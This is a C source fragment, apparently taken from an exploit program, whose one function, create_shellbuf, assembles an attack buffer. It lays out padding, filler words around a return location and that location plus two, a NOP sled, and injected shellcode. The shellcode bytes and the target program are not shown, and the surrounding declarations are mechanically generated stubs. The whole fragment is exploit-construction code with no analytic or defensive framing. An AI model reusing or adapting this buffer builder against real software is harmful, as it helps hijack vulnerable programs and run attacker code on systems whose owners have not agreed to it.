
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int NOP ;
 long SHELL ;
 scalar_t__ contains_zero (int) ;
 int exit (int) ;
 int memcpy (char*,char*,int) ;
 int printf (char*,int,...) ;
 char* put_long (char*,int) ;
 char* shellcode ;
 int strlen (char*) ;

void create_shellbuf(char* shellbuf, int align, int retloc)
{
    char *ptr;
    int i;



    if (align < 0 || align > 3) {
        printf("Error: align is %d, it should be between 0 and 3\n", align);
        exit(1);
    }



    if (contains_zero(retloc) || contains_zero(retloc+2) ) {
        printf("Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\n", retloc, retloc+2);
        exit(1);
    }



    ptr = shellbuf;

    for (i = 0; i < align; i++) {
        *ptr++ = 0x41;
    }

    ptr = put_long(ptr, 0x42424242);

    ptr = put_long(ptr, retloc);


    ptr = put_long(ptr, 0x42424242);

    ptr = put_long(ptr, retloc + 2);




    while ((long)ptr + 4 + strlen(shellcode) + 1 < (long)shellbuf + SHELL) {
        ptr = put_long(ptr, NOP);
    }

    memcpy(ptr, shellcode, strlen(shellcode));
    ptr = ptr + strlen(shellcode);



    while ((long)ptr < (long)shellbuf + SHELL - 1) {
        *ptr++ = 0x41;
    }

    *ptr = 0;



    if (strlen(shellbuf) + 1 != SHELL) {
        printf("Error: The shell buffer is %d bytes long. It should be %d bytes. Something went terribly wrong...\n",
                strlen(shellbuf)+1, SHELL);
        exit(1);
    }

    return;
}
